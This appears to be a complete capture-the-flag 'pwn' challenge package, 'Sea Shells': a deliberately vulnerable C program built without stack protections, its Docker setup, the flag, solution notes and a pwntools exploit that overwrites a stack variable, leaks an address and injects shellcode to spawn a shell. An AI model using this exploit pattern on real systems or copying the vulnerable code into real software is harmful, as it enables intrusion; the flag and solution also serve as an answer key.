{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n",
    "flag.txt": "gigem{cr34t1v3_5h3llc0d3_ftw}\n",
    "Makefile": "CC := $(or $(CC),gcc) \nCFLAGS := -w -fno-stack-protector -z execstack \nNAME := sea_shells\nPORT := 9999\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\tdocker rm -f $(NAME)\n\tdocker rmi $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile \n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c solver-template.py\n\n.PHONY:\n",
    "README.md": "# Sea Shells \n\nAuthor: `_mac_`\n\nSally sold some seashells by the seashore. Try to guess how many she sold, I bet you will never be able to!\n\n## Dev Notes\nGiven files: `sea_shells.c` and `sea_shells``\n\n**Setup:**\n```\nsudo make docker\nsudo make run\n```\n\nBy default `sea_shells` is running on port 9999\n\n**Cleanup:**\n```\nsudo make clean\n```\n\n## Solution\nFirst use the overflow provided by the scanf to overwrite num_sold, that way we know what it is.\nThen get the leak by \"guessing\" the num_sold correctly, which is doable since you set the value.\nNext, send shellcode to do a read, by putting the shellcode in a, b, c, and d variables, taking into account the math operating on those variables.\nThen send nopslide+shellcode to the read, getting a shell.\nSolve in `solve.py`\n\n`gigem{cr34t1v3_5h3llc0d3_ftw}`\n",
    "sea_shells.c": "#include <stdio.h>\n#include <stdlib.h>\n\nint check(unsigned long n, unsigned long sold) {\n    if ((n & 0xffff) == (sold & 0xffff)) {\n        return 1;\n    }\n    return 0;\n}\n\nvoid vuln() {\n    unsigned long num_sold;\n    char resp;\n    unsigned long a;\n    unsigned long b;\n    unsigned long c;\n    unsigned long d;\n    \n    num_sold = rand();\n\n    printf(\"It's not that easy though, enter 4 numbers to use to guess!\\n\");\n    \n    do {\n        // ask user for input\n        printf(\"1st number: \");\n        scanf(\"%lu\", &a);\n        printf(\"2nd number: \");\n        scanf(\"%lu\", &b);\n        printf(\"3rd number: \");\n        scanf(\"%lu\", &c);\n        printf(\"4th number: \");\n        scanf(\"%lu\", &d);\n\n        // perform some calculations on the numbers\n        d = d + c;\n        c = c ^ b;\n        b = b - a;\n\n        if (check(d, num_sold)) {\n                printf(\"Woohoo! That's exactly how many she sold!\\n\");\n                printf(\"Here's a little something Sally wants to give you for your hard work: %lx\\n\", &d);\n        } else {\n                printf(\"Sorry, that's not quite right :(\\n\");\n        }\n\n        // go again?\n        printf(\"Would you like to guess again? (y/n) \");\n        scanf(\"%s\", &resp);\n\n    } while (resp == 'Y' || resp == 'y');\n\n    return;\n}\n\nvoid welcome() {\n    printf(\"Sally sold some sea SHELLS!\\n\");\n    printf(\"Try to guess exactly how many she sold, I bet you can't!!\\n\");\n}\n\nint main() {\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n    welcome();\n    vuln();\n    \n    printf(\"'bye now'\\n-Sally\\n\");\n    return 0;\n}\n",
    "solve.py": "#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"./sea_shells\")\n\ncontext.binary = exe\n\n\ndef conn():\n    if args.LOCAL:\n        r = process([exe.path])\n        gdb.attach(r)\n    else:\n        r = remote(\"localhost\", 9999)\n\n    return r\n\n\ndef main():\n    r = conn()\n\n    # good luck pwning :)\n    r.recvuntil(b\"guess!\\n\")\n\n    # use the overflow to overwrite num_sold\n    r.send(b'0\\n'*4)\n    r.sendline(b'y' + b'\\x00'*4)\n    r.send(b'0\\n'*4)\n\n    r.recvuntil(b'work: ')\n    leak = int(r.recvline(), 16)\n\n    r.sendline('y')\n   \n    sc = asm(f'''\n    xor eax, eax\n    mov rsi, {hex(leak+18)}\n    xor edi, edi\n    mov edx, esi\n    syscall\n    ''')\n    #print('DEBUG', len(sc))\n    #print('DEBUG', disasm(sc))\n    #exit()\n\n    r.sendline(str(u64(sc[8:10]+b'\\x00'*6)-0x050F))\n    r.sendline(str(u64(sc[8:16])))\n    r.sendline(str(0x0000000000000000))\n    r.sendline(str(u64(sc[:8])))\n    r.sendline(b'n' + b'E'*16 + p64(leak))\n   \n    sleep(1)\n    r.sendline(b'\\x90'*32 + asm('sub rsp, 0x30') + asm(shellcraft.sh()))\n\n    r.interactive()\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "category": "pwn"
}